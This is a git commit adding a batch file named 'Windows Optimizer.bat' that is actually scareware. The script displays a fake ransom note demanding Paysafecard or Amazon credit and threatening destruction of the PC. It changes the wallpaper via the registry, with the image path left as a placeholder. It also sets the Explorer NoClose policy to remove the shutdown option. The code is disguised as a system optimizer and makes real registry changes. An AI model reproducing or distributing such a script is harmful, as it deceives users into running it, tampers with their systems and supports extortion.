18049d013b12343c9260b6aa74e5e9154326287c
WindowsHacks <106410123+WindowsHacks@users.noreply.github.com>
2022-05-27 23:56:56 +0200

    Add files via upload

---
+++ Windows Optimizer.bat
@@ -0,0 +1,14 @@
+
+
+
+@echo off
+title .Bat virus
+echo Thank you for downloading our virus we now have all your data and will give it back to you in exchange for 100 euro or do Dollar Paysafecard credit or amazon credit if you turn off your PC all data will be deleted and we will destroy your PC forever so welcome to the game .bat!
+
+reg add "HKCU\Control Panel\Desktop" /v "Wallpaper" /d "<hier der pfad zur bilddatei>" /t REG_SZ /f
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\explorer /v NoClose /t REG_DWORD /d 1
+
+
+pause
+
